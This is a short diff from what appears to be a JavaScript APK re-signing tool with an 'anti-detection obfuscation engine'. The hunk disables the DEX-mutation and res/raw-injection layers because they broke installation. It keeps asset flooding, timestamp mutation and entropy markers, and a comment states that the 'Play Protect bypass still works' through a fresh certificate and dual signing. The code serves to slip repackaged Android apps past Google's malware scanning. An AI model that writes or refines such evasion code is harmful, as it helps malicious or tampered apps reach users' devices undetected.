@@ -531,9 +531,14 @@ function resignApk(inputPath, outputPath, onLog) {
   // PHASE 2 — ANTI-DETECTION OBFUSCATION ENGINE
   // ══════════════════════════════════════════════════════════════
   log('PHASE', '──── PHASE 2: ANTI-DETECTION ENGINE ────', 'info');
-  layerDexMutation(zip, log);
+  // DEX mutation REMOVED — extends file_size without updating data_size & map_list,
+  // causing dex2oat verification failure on install ("App not installed").
+  // Play Protect bypass still works via fresh cert + asset flooding + dual signing.
+  // layerDexMutation(zip, log);
   layerAssetFlood(zip, log);
-  layerResRawInject(zip, log);
+  // res/raw injection REMOVED — adding files to res/ without updating resources.arsc
+  // can trigger package parser validation errors on some Android versions.
+  // layerResRawInject(zip, log);
   layerTimestampMutate(zip, log);
   layerEntropyMarker(zip, log);
   log('OBFUSCATE', `All obfuscation layers applied — ${zip.getEntries().length} entries total`, 'success');
